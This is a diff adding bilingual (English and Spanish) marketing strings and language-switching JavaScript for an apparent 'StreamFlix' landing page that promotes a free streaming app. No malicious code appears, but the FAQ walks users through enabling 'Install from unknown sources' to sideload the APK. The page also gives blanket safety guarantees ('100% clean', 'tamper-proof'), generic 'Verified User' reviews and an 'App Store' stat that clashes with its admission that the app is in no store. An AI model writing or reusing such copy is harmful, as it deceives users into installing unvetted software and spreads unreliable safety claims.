+hero_stat1:'Active Users',
+hero_stat2:'App Store',
+hero_stat3:'Quality',
+hero_cta:'Download Free — Start Watching',
+scroll_hint:'Swipe',
+trending_label:'Trending Now',
+trending_h_a:'What the world',
+trending_h_b:'is watching',
+trending_sub:'Top picks, updated daily',
+card_hot:'HOT',
+card_new:'NEW',
+card_top:'TOP',
+card_4k:'4K',
+card_hd:'HD',
+live_titles:'Titles',
+live_rating:'Rating',
+live_downloads:'Downloads',
+feat_label:'Why StreamFlix',
+feat_h_a:'Everything you',
+feat_h_b:"need. Nothing you don't.",
+feat1_h:'4K HDR',
+feat1_p:'Dolby Vision & Atmos. Cinema-grade quality in your hands.',
+feat2_h:'Offline Mode',
+feat2_p:'Download anything. Watch on planes, trains, anywhere.',
+feat3_h:'Multi-Device',
+feat3_p:'Phone, tablet, TV — pause on one, resume on another.',
+feat4_h:'Early Access',
+feat4_p:'Exclusive premieres & behind-the-scenes before anyone else.',
+bigfeat_h:'⚡ Watch together, even apart',
+bigfeat_1:'<strong style="color:#fff">Sync Play</strong> — watch in perfect sync with friends, anywhere in the world',
+bigfeat_2:'<strong style="color:#fff">5 Profiles</strong> — each with personalized recommendations',
+bigfeat_3:'<strong style="color:#fff">Kids Mode</strong> — safe, curated content for the little ones',
+bigfeat_4:'<strong style="color:#fff">AI Subtitles</strong> — real-time translation in 40+ languages',
+reviews_label:'Loved by Millions',
+reviews_h_a:"Don't take our",
+reviews_h_b:'word for it',
+review1:'"Finally an app that actually delivers. The 4K quality is insane and offline downloads saved my commute. Cancelled everything else."',
+review2:'"Multi-device sync is flawless. I start on my TV, finish on my phone in bed. The library is massive and the AI recommendations are scary good."',
+review3:'"Kids Mode is a lifesaver. My children have their own space and I don\'t worry about what they\'ll find. Best streaming app for families hands down."',
+verified_user:'Verified User',
+stat1:'Downloads Worldwide',
+stat2:'Average Rating',
+stat3:'Countries Available',
+stat4:'Uptime Guarantee',
+sec_label:'Safe & Verified',
+sec_h_a:'Your security',
+sec_h_b:'is our priority',
+sec_sub:'Every release is scanned, signed, and verified before it reaches you.',
+sec1_a:'VirusTotal Scanned',
+sec1_b:'100% clean · 72 engines passed',
+sec2_a:'SHA-256 Signed',
+sec2_b:'Cryptographically verified · tamper-proof',
+sec3_a:'Auto-Update',
+sec3_b:'Get the latest version as soon as we release',
+sec4_a:'No Permissions Abuse',
+sec4_b:"Only requests what's strictly needed",
+faq_label:'FAQ',
+faq_h_a:'Got questions?',
+faq_h_b:"We've got answers.",
+faq1_q:'Is the APK safe to install?',
+faq1_a:'Absolutely. Every release goes through VirusTotal scanning (72+ engines), SHA-256 code signing, and manual security review before publication. We never bundle adware, spyware, or unwanted software. You can verify the signature yourself using the hash published on our security page.',
+faq2_q:"Why isn't the app on Google Play or App Store?",
+faq2_a:"We're currently in a rapid iteration phase — shipping updates every 2 weeks with new features and improvements. Direct distribution lets us move faster without app store review delays. App store listings are planned for late 2026 once we hit our feature-complete milestone. Same app, same quality, just faster updates for you.",
+faq3_q:'How do I install the APK on Android?',
+faq3_a:'1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you\'re done! The app will auto-update itself after that — no need to manually download future versions.',
+faq4_q:"Is it really free? What's the catch?",
+faq4_a:"Yes — 100% free. No hidden fees, no forced subscriptions, no paywalls on content. We're building our user base and believe that if we make the best streaming experience, growth follows. Premium features (like offline downloads and 4K) are also free during our launch period. Enjoy it while it lasts!",
+faq5_q:'Which devices and OS versions are supported?',
+faq5_a:'Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV, and Fire TV Stick. We recommend at least 2 GB of RAM for the best 4K streaming experience. Chromecast and AirPlay support are built in.',
+faq6_q:'How do I get updates after installing?',
+faq6_a:'The app has a built-in auto-updater. When a new version is available, you\'ll get a notification inside the app — just tap "Update" and it handles everything. No need to revisit this page or manually download again. We push updates every ~2 weeks with fixes and new features.',
+footer_copy:'© 2026 StreamFlix',
+footer_priv:'Privacy',
+footer_terms:'Terms',
+footer_sec:'Security',
+float_cta:'Download Free'
+},
+es:{
+hero_eyebrow:'#1 App de Entretenimiento · 2026',
+hero_title_a:'Cine en tu',
+hero_title_b:'bolsillo',
+hero_desc:'Transmite blockbusters, series completas, descarga para ver sin conexión — todo en impresionante 4K HDR. Sin anuncios. Nunca.',
+hero_stat1:'Usuarios Activos',
+hero_stat2:'App Store',
+hero_stat3:'Calidad',
+hero_cta:'Descargar Gratis — Comienza a Ver',
+scroll_hint:'Desliza',
+trending_label:'Tendencias',
+trending_h_a:'Lo que el mundo',
+trending_h_b:'está viendo',
+trending_sub:'Selecciones principales, actualizadas a diario',
+card_hot:'POPULAR',
+card_new:'NUEVO',
+card_top:'TOP',
+card_4k:'4K',
+card_hd:'HD',
+live_titles:'Títulos',
+live_rating:'Puntuación',
+live_downloads:'Descargas',
+feat_label:'Por Qué StreamFlix',
+feat_h_a:'Todo lo que',
+feat_h_b:'necesitas. Nada más.',
+feat1_h:'4K HDR',
+feat1_p:'Dolby Vision y Atmos. Calidad cinematográfica en tus manos.',
+feat2_h:'Modo Sin Conexión',
+feat2_p:'Descarga lo que quieras. Mira en aviones, trenes, donde sea.',
+feat3_h:'Multi-Dispositivo',
+feat3_p:'Teléfono, tablet, TV — pausa en uno, continúa en otro.',
+feat4_h:'Acceso Anticipado',
+feat4_p:'Estrenos exclusivos y contenido detrás de cámaras antes que nadie.',
+bigfeat_h:'⚡ Mira juntos, incluso separados',
+bigfeat_1:'<strong style="color:#fff">Sync Play</strong> — mira en perfecta sincronía con amigos, en cualquier parte del mundo',
+bigfeat_2:'<strong style="color:#fff">5 Perfiles</strong> — cada uno con recomendaciones personalizadas',
+bigfeat_3:'<strong style="color:#fff">Modo Niños</strong> — contenido seguro y curado para los más pequeños',
+bigfeat_4:'<strong style="color:#fff">Subtítulos IA</strong> — traducción en tiempo real en más de 40 idiomas',
+reviews_label:'Amado por Millones',
+reviews_h_a:'No creas solo',
+reviews_h_b:'nuestra palabra',
+review1:'"Por fin una app que cumple. La calidad 4K es increíble y las descargas sin conexión salvaron mi viaje. Cancelé todo lo demás."',
+review2:'"La sincronización multi-dispositivo es perfecta. Empiezo en mi TV, termino en mi teléfono en la cama. La biblioteca es enorme y las recomendaciones de IA son increíblemente precisas."',
+review3:'"El Modo Niños es un salvavidas. Mis hijos tienen su propio espacio y no me preocupo por lo que puedan encontrar. La mejor app de streaming para familias sin duda."',
+verified_user:'Usuario Verificado',
+stat1:'Descargas en Todo el Mundo',
+stat2:'Puntuación Media',
+stat3:'Países Disponibles',
+stat4:'Garantía de Disponibilidad',
+sec_label:'Seguro y Verificado',
+sec_h_a:'Tu seguridad es',
+sec_h_b:'nuestra prioridad',
+sec_sub:'Cada versión es analizada, firmada y verificada antes de llegar a ti.',
+sec1_a:'VirusTotal Analizado',
+sec1_b:'100% limpio · 72 motores aprobados',
+sec2_a:'Firmado SHA-256',
+sec2_b:'Verificado criptográficamente · a prueba de manipulaciones',
+sec3_a:'Actualización Automática',
+sec3_b:'Recibe la última versión tan pronto como la publicamos',
+sec4_a:'Sin Abuso de Permisos',
+sec4_b:'Solo solicita lo estrictamente necesario',
+faq_label:'Preguntas Frecuentes',
+faq_h_a:'¿Tienes preguntas?',
+faq_h_b:'Tenemos respuestas.',
+faq1_q:'¿Es seguro instalar el APK?',
+faq1_a:'Absolutamente. Cada versión pasa por el análisis de VirusTotal (más de 72 motores), firma de código SHA-256 y revisión de seguridad manual antes de su publicación. Nunca incluimos adware, spyware ni software no deseado. Puedes verificar la firma tú mismo usando el hash publicado en nuestra página de seguridad.',
+faq2_q:'¿Por qué la app no está en Google Play o App Store?',
+faq2_a:'Estamos en una fase de iteración rápida — publicando actualizaciones cada 2 semanas con nuevas funciones y mejoras. La distribución directa nos permite avanzar más rápido sin los retrasos de revisión de las tiendas de aplicaciones. Las publicaciones en tiendas están planificadas para finales de 2026 una vez que alcancemos nuestro hito de funciones completas. La misma app, la misma calidad, solo que con actualizaciones más rápidas para ti.',
+faq3_q:'¿Cómo instalo el APK en Android?',
+faq3_a:'1. Toca el botón Descargar APK arriba.<br>2. Abre el archivo .apk descargado.<br>3. Si se te solicita, permite "Instalar desde fuentes desconocidas" en Configuración → Seguridad.<br>4. ¡Toca Instalar y listo! La app se actualizará automáticamente después — no necesitas descargar manualmente versiones futuras.',
+faq4_q:'¿Es realmente gratis? ¿Cuál es la trampa?',
+faq4_a:'Sí — 100% gratis. Sin cargos ocultos, sin suscripciones forzadas, sin muros de pago en el contenido. Estamos construyendo nuestra base de usuarios y creemos que si hacemos la mejor experiencia de streaming, el crecimiento llega solo. Las funciones premium (como descargas sin conexión y 4K) también son gratuitas durante nuestro período de lanzamiento. ¡Disfrútalas mientras dure!',
+faq5_q:'¿Qué dispositivos y versiones de SO son compatibles?',
+faq5_a:'Android 8.0 (Oreo) y superior para el APK. iOS 14+ para el IPA. Funciona en teléfonos, tabletas, Android TV y Fire TV Stick. Recomendamos al menos 2 GB de RAM para la mejor experiencia de streaming 4K. Chromecast y AirPlay están integrados.',
+faq6_q:'¿Cómo obtengo actualizaciones después de instalar?',
+faq6_a:'La app tiene un actualizador automático integrado. Cuando una nueva versión esté disponible, recibirás una notificación dentro de la app — solo toca "Actualizar" y se encarga de todo. No necesitas volver a visitar esta página ni descargar manualmente de nuevo. Publicamos actualizaciones aproximadamente cada 2 semanas con correcciones y nuevas funciones.',
+footer_copy:'© 2026 StreamFlix',
+footer_priv:'Privacidad',
+footer_terms:'Términos',
+footer_sec:'Seguridad',
+float_cta:'Descargar Gratis'
+}
+};
+var lang=(function(){
+var p=window.location.pathname.toLowerCase();
+if(p.indexOf('estv')!==-1)return 'es';
+if(p.indexOf('index')!==-1)return 'en';
+var s=localStorage.getItem('sflix_lang');
+if(s==='en'||s==='es')return s;
+return 'en';
+})();
+function applyLanguage(l){
+document.documentElement.lang=l;
+var els=document.querySelectorAll('[data-i18n]');
+for(var i=0;i<els.length;i++){
+var k=els[i].getAttribute('data-i18n');
+if(T[l]&&T[l][k]!==undefined){
+var v=T[l][k];
+if(v.indexOf('<')!==-1&&v.indexOf('>')!==-1){
+els[i].innerHTML=v;
+}else{
+els[i].textContent=v;
+}
+}
+}
+var links=document.querySelectorAll('.lang-float a');
+for(var j=0;j<links.length;j++){
+var ll=links[j].getAttribute('data-lang');
+if(ll===l){links[j].classList.add('active');}
+else{links[j].classList.remove('active');}
+}
+if(l==='es'){
+document.title='StreamFlix — Cine en tu Bolsillo';
+var md=document.querySelector('meta[name="description"]');
+if(md)md.setAttribute('content','StreamFlix — Transmite blockbusters, series completas y mira sin conexión en 4K HDR. Sin anuncios. Descarga el APK gratis para Android.');
+}
+localStorage.setItem('sflix_lang',l);
+}
+applyLanguage(lang);
+})();
+</script>
+</body>
+</html>
